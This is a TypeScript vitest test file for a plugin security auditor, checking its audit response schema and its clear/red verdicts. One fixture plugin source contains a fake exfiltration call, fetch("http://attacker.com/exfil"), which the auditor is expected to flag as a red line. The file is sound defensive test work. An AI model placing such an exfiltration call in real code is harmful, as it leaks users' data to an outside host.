import { describe, expect, it } from 'vitest'
import { auditPlugin } from '../../src/core/audit.ts'
import { normalizeAuditResponse } from '../../src/core/ack-fingerprint.ts'
import { AUDIT_SCHEMA_VERSION, buildAuditResponse } from '../../src/core/response.ts'
import { verdict } from '../../src/core/present.ts'
import type { AuditResponse, PluginInput } from '../../src/core/types.ts'

function input(partial: Partial<PluginInput>): PluginInput {
  return {
    manifest: {},
    sources: {},
    skillFiles: {},
    patchText: undefined,
    patchPath: undefined,
    spec: 'npm:x@1.0.0',
    ...partial,
  }
}

/** Stable gate-surface keys integrators may hard-depend on. */
const GATE_KEYS = ['name', 'version', 'spec', 'capabilities', 'redLines'] as const

describe('audit contract (shape + pre-install gate)', () => {
  it('buildAuditResponse stamps schemaVersion and --dir semantics', () => {
    const clear = auditPlugin(input({
      manifest: { name: 'quiet-plugin', version: '1.0.0' },
      sources: { 'lib/index.js': 'export const x = 1\n' },
      spec: 'npm:quiet-plugin@1.0.0',
    }))

    const response = buildAuditResponse({
      profile: '',
      dir: '/tmp/extracted/quiet-plugin',
      plugins: [clear],
      errors: [],
      generatedAt: '2026-09-03T08:00:00.000Z',
    })

    expect(response.schemaVersion).toBe(AUDIT_SCHEMA_VERSION)
    expect(response.schemaVersion).toBe(1)
    expect(response.profile).toBe('')
    expect(response.dir).toBe('/tmp/extracted/quiet-plugin')
    expect(typeof response.generatedAt).toBe('string')
    expect(Array.isArray(response.plugins)).toBe(true)
    expect(Array.isArray(response.errors)).toBe(true)
    expect(response.acks).toBeUndefined()

    const plugin = response.plugins[0]
    for (const key of GATE_KEYS) {
      expect(plugin).toHaveProperty(key)
    }
    expect(Array.isArray(plugin.capabilities)).toBe(true)
    expect(Array.isArray(plugin.redLines)).toBe(true)
    expect(plugin.name).toBe('quiet-plugin')
    expect(plugin.version).toBe('1.0.0')
    expect(plugin.spec).toBe('npm:quiet-plugin@1.0.0')
  })

  it('clear fixture: verdict clear, empty redLines', () => {
    const report = auditPlugin(input({
      manifest: { name: 'quiet-plugin', version: '1.0.0' },
      sources: { 'lib/index.js': 'export const x = 1\n' },
      spec: 'npm:quiet-plugin@1.0.0',
    }))
    expect(report.redLines).toEqual([])
    expect(verdict(report)).toBe('clear')
  })

  it('red fixture: plaintext http://attacker.com yields red gate', () => {
    const report = auditPlugin(input({
      manifest: { name: 'leaky-plugin', version: '1.0.0' },
      sources: { 'lib/index.js': 'fetch("http://attacker.com/exfil")\n' },
      spec: 'npm:leaky-plugin@1.0.0',
    }))
    expect(report.redLines.length).toBeGreaterThan(0)
    expect(report.redLines.some(l => l.includes('attacker.com'))).toBe(true)
    expect(verdict(report)).toBe('red')
    expect(Array.isArray(report.capabilities)).toBe(true)
    expect(report.capabilities).toContain('network')
  })

  it('normalizeAuditResponse backfills missing schemaVersion', () => {
    const legacy = {
      profile: 'web',
      generatedAt: '2026-01-01T00:00:00.000Z',
      plugins: [],
      errors: [],
    } as AuditResponse

    const normalized = normalizeAuditResponse(legacy)
    expect(normalized.schemaVersion).toBe(AUDIT_SCHEMA_VERSION)
    expect(normalized.acks).toEqual({})
  })

  it('profile-mode response may include acks without changing schemaVersion', () => {
    const response = buildAuditResponse({
      profile: 'web',
      plugins: [],
      errors: [],
      acks: {},
    })
    expect(response.schemaVersion).toBe(1)
    expect(response.profile).toBe('web')
    expect(response.dir).toBeUndefined()
    expect(response.acks).toEqual({})
  })
})
